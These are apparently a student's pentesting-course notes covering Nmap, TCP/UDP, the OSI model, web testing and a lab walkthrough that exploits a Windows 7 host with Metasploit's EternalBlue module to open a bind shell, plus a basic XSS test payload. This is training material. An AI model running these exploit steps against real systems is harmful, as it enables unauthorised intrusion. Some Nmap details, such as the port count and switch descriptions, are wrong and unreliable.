<!---DOC:Secarma Pentesting notes;Notes that I took while at the pentesting course;Sean Lewis-->
# Secarma Pentesting fun times

## Introduction

We'll be getting the slides after the 3 sessions.

## Day 1

### Basics

Laws:

* Incredibly vague to cover more ground
  - It is illegal to connect to someone's wifi, technically your connection is logged which is "unauthorised access to computer material."

KALI LINUX:

* Information security professionals platform of choice
* Debatable whether it is good or not?
* Built upon Debian Linux, real damn stable.
* Covering three tools:
  - Nmap - networks
  - Burpsuite - web applications
  - Metasploit - a lot, for now servers

Burpsuite:

* Java based
* Can be done manually or automatically
* Used to enumerate, scan and attack web applications.

Transmission Control Protocol (TCP):

* Operates at level 4 OSI model
* Reliable for the transfer of data


User Datagram Protocol (UDP):

* Also operates at level 4 OSI model
* Connectionless - no guarantee that data will arrive at its destination
* Often used for VOIP

Common ports:

* 80: HTTP
* 443: HTTPS
* 21: FTP (but technically the connection part of it?)

OSI model:

* 7) Application
* 6) Presentation
* 5) Session
* 4) Transport
* 3) Network
* 2) Data Link
* 1) Physical

NMAP:

* Free and open source
* Used to determine what hosts are on a network, what services they run and what ports are open.
* Some command line switches:
  - -v Verbose.
  - -p Scans all 66535 TCP ports.
  - -sC Performs a script scan using a default set of scripts from the nmap scripting engine (NSE).
  - -sV Performs a version scan of the open ports that nmap discovers.
  - -oA
* NMAP scripting engine
  - Allows users to write and share simple scripts to automate a wide variety of networking tasks.
  - We can gather more sophisticated version detection, vulnerability detection and in some cases we can even use them for vulnerability exploitation.
  - Has the extension `'.nse'` located at `/usr/share/nmap/scripts` in KALI.

```bash
# Example commands!

# Scan range 0/24 all ports including 0
nmap -p- 10.0.6.0/24

# Scan range 0/24 all ports excluding 0
nmap -p0- 10.0.6.0/24
```

### NMAP Exploit!

First, I needed to gather some information on the target system. For me, the IP address was `10.0.6.46`.

```bash
nmap -Pn -sTV -A 10.0.6.46
```

This returned the specific version of Windows, so literally appending "exploit" to the verison it gave `Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)`.

This lead to this link: https://www.exploit-db.com/exploits/42315/

I took the name of the exploit, and searched for it with metasploit: _"metasploit eternalblue"_. This gave instructions for using metasploit! https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue.

I ran `msfconsole` to open Metasploit. The website that had instructions gave the correct explit to load:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

This will set up the exploit. From here you can view the options:

```bash
show options
```

It will list all of the options, their current values and whether they are required for the exploit. One required option will be missing, `RHOST`. Set this to the target server with the following command:

```bash
set RHOST 10.0.6.46
```

Now we will need to select the payload. The exploit will get us access to the system, but we will need to execute something while we are there. You can view all of the available payloads for the exploit using:

```bash
show payloads
```

I wanted access to a command shell, so I used the following command to select it:

```bash
set payload generic/shell_bind_tcp
```

If this exploit supported checking, we could have ran a command that would have checked if it would be successful. The command would have been:

```bash
check
```

If it is attempted with the current exploit and payload, it will just display `This module does not support check`.

To execute the exploit, you can run either of these two commands:

* The normal, less to type way `run`
* The cooler sounding way `exploit`

There will be a lot of output, but if it was successful typing `dir` and pressing enter should display the directory on the Windows machine. There you have it, you are officially a `H A C K E R  M A N`.

### Web 101

Forced browsing:

* Some good options:
  - Dirbuster: not too great
    - Available on Kali.
    - Wordlist location in kali is `/usr/share/wordlists`.

Don't leak info:

* A default 404 page can leak information on what the system is
* Bad error messages can leak database schema/SQL version

XSS:

* Three types:
  * Reflected XSS
    - URL
  * Stored XSS
    - Hits everybody
  * DOM XSS
*  Modern browsers will strip bad JavaScript, prevent XSS.
  - This will not help older browsers/systems.
* Initial testing to see if XSS works:

```html
<script>alert(1)</script>
```

SQL Injection:

* One of the oldest and most prevalent vulnerabilities.
* It impacts:
  - Confidentiality
  - Integrity
  - Availability


## Day 2

## Day 3
